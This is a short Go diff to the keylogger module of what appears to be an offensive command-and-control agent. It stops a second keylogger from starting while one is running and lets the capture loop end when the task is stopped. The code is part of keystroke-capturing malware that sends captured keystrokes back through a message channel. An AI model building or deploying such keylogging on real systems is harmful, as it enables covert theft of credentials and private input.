@@ -2,6 +2,8 @@ package keystate
 
 import (
 	"encoding/json"
+	"errors"
+	"fmt"
 	"log"
 	"os/user"
 	"sync"
@@ -132,6 +134,9 @@ func NewKeyLog() (KeyLog, error) {
 
 func StartKeylogger(task structs.Task, threadChannel chan<- structs.ThreadMsg) error {
 	// This function is responsible for dumping output.
+	if curTask != nil && curTask.Job.Monitoring {
+		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.ID))
+	}
 	curTask = &task
 	msgChan = threadChannel
 	go func() {
@@ -143,6 +148,9 @@ func StartKeylogger(task structs.Task, threadChannel chan<- structs.ThreadMsg) e
 				ksmonitor.SendMessage()
 				ksmonitor.Keystrokes = ""
 				ksmonitor.mtx.Unlock()
+			}
+			if *task.Job.Stop > 0 {
+				break
 			}
 		}
 	}()
